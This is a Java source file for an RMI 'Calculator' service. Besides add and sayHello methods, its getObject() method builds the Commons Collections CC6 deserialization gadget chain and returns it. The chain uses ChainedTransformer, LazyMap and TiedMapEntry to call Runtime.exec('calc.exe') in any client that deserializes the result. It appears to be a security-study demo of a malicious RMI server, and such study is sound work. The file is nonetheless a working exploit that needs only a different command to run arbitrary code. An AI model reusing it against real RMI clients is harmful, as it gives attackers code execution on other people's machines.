package com.lingx5;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import java.util.HashMap;

public class Caculatorimpl extends UnicastRemoteObject implements Calculator {
    private static final long serialVersionUID = 1L;

    public Caculatorimpl() throws RemoteException {
        super();
    }


    @Override
    public int add(int a, int b) throws RemoteException {
        System.out.println("a+b="+(a+b));
        return a+b;
    }
    public String sayHello(String name) throws RemoteException {
        System.out.println("Hello "+name);
        return "Hello "+name;
    }
    public void sayGood(Object o){}

    @Override
    public Object getObject() throws RemoteException {
        // 创建Transform数组，构造CC6链条
        HashMap<Object, Object> hashMap = new HashMap<>();
        try {
            Transformer[] transforms = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})

            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transforms);
            LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), new ConstantTransformer(null));
            TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "lingx5");

            hashMap.put(tiedMapEntry, "lingx5");
            Field factory = LazyMap.class.getDeclaredField("factory");
            factory.setAccessible(true);
            factory.set(lazyMap, chainedTransformer);
            lazyMap.remove("lingx5");
        } catch (Exception e) {
            e.printStackTrace();
        }
        return hashMap;
    }

}
